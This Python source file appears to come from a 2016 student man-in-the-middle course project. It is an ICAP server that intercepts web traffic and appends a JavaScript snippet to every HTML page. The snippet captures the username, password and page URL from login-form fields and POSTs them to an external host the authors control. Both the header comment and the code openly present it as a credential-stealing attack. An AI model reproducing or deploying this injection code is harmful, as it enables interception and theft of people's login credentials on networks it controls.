#! /usr/bin/env python
# -*- coding: utf8 -*-

#####################################################
##                                                 ##
## Author: Alexis Thual && Victor Quach            ##
## Date: June 9, 2016                              ##
## Project: MITM (INF474X)                         ##
##                                                 ##
## Location:  RaspberryPi, /srv/icap.py            ##              
## This is our ICAP server.                        ##
## It appends a JS script at the bottom of every   ##
## HTML page. This script sends passwords to our   ##
## VPS                                             ##
##                                                 ## 
#####################################################




import SocketServer
import zlib
import gzip
import os
import os.path
import urllib
import time
import random
import subprocess
import fcntl

from pyicap import *


def make_nonblocking(file):
    fd = file.fileno()
    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

def facebook_script():
    snippet = """
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
<script type="text/javascript">
$("#wpLoginAttempt").click(function() {
    var m = $("#wpName1").val();
    var p = $("#wpPassword1").val();
    var u = window.location.href;
    $.ajax({
       type: "POST",
       url: "http://varal7.fr/modal/traitement.php",
       data: {pass:p, email:m, url:u},
       success: function() {}
    });
  });
</script>
"""
    return snippet

class Pipe:
    def __init__(self, generator):
        self.gen = generator
        self.buffer = ''
        self.eof = False
        self.last_read = ''
        self.pos = 0
        self.hack_not_eof = False

    def next(self):
        if self.eof:
            return ''
        try:
            return next(self.gen)
        except StopIteration:
            self.eof = True
            return ''

    def tell(self):
        if self.eof or not self.hack_not_eof:
            return self.pos
        else:
            self.hack_not_eof = False
            return -1

    def read(self, size):

        while len(self.buffer)<size and not self.eof:
            self.buffer+=self.next()

        self.last_read = self.buffer[:size]
        self.pos += len(self.last_read)
        self.buffer = self.buffer[size:]

        return self.last_read

    def seek(self, offset, whence=0):

        if whence == 1 and offset<0:
            #from here
            if offset > len(self.last_read):
                raise NotImplementedError



            self.buffer = self.last_read[offset:] + self.buffer
            self.pos -= offset
            self.last_read = self.last_read[:offset]
        elif whence == 2:
            #this is a hack
            self.hack_not_eof = True

    def flush(self):
        pass

class ThreadingSimpleServer(SocketServer.ThreadingMixIn, ICAPServer):
    pass

class ICAPHandler(BaseICAPRequestHandler):

    def example_OPTIONS(self):
        self.set_icap_response(200)
        self.set_icap_header('Methods', 'RESPMOD')
        self.set_icap_header('Service', 'PyICAP Server 1.0')
        self.set_icap_header('Preview', '0')
        self.set_icap_header('Transfer-Preview', '*')
        # self.set_icap_header('Transfer-Ignore', 'jpg,jpeg,gif,png,swf,flv')
        self.set_icap_header('Transfer-Complete', '')
        self.set_icap_header('Max-Connections', '100000')
        self.set_icap_header('Options-TTL', '600')
        self.send_headers(False)

    def example_RESPMOD(self):
        # detect compression
        self.compressed = None
        if  len(self.enc_res_headers.get("content-encoding", []))>0:
            self.compressed=self.enc_res_headers["content-encoding"][0]

        # check if it is html
        type = "".join(self.enc_res_headers.get("content-type", []))
        if "text/html" in type:
            print("html")
            self.process_html()
        else:
            return self.no_adaptation_required()

    def process_html(self):
        # then we will modify the response
        self.set_icap_response(200)

        #copy headers except content-length and content-encoding
        self.set_enc_status(' '.join(self.enc_res_status))
        for h in self.enc_res_headers:
            #for v in self.enc_res_headers[h]:
                #print "get",h,v
            if h.lower()=="content-length":
                continue
            elif h.lower()=="content-encoding":
                self.gzip = True
                continue
            elif h.lower()=="cache-control":
                continue
            for v in self.enc_res_headers[h]:
                self.set_enc_header(h, v)
                #print "set",h,v
        self.set_enc_header("Cache-Control", "no-cache, max-age=10")


        if not self.has_body:
            self.send_headers(False)
            return

        #copy received data
        for chunk in self.get_flat_payload():
            self.write_chunk(chunk)

        # append our data
        self.write_chunk(facebook_script())
        self.write_chunk('')


    def get_flat_payload(self):
        if self.compressed == "deflate":
            decompressor = zlib.decompressobj()
            for chunk in self.get_payload():
                if chunk:
                    yield decompressor.decompress(chunk)
        elif self.compressed == "gzip":
            decompressor = gzip.GzipFile(fileobj=Pipe(self.get_payload()))
            while True:
                chunk = decompressor.read(4096)

                if not chunk:
                    break
                yield chunk
        else:
            for chunk in self.get_payload():
                if chunk:
                    yield chunk


    def get_payload(self):
        if self.preview:
            prevbuf = ''
            while True:
                chunk = self.read_chunk()
                if chunk == '':
                    break
                prevbuf += chunk
            if self.ieof:
                self.send_headers(True)
                yield prevbuf
                return
            self.cont()
            self.send_headers(True)
            if len(prevbuf) > 0:
                yield prevbuf
        else:
            self.send_headers(True)
        while True:
            chunk = self.read_chunk()
            yield chunk
            if chunk == '':
                break


port = 13440

server = ThreadingSimpleServer(('', port), ICAPHandler)
try:
    while 1:
        server.handle_request()
except KeyboardInterrupt:
    print "Finished"

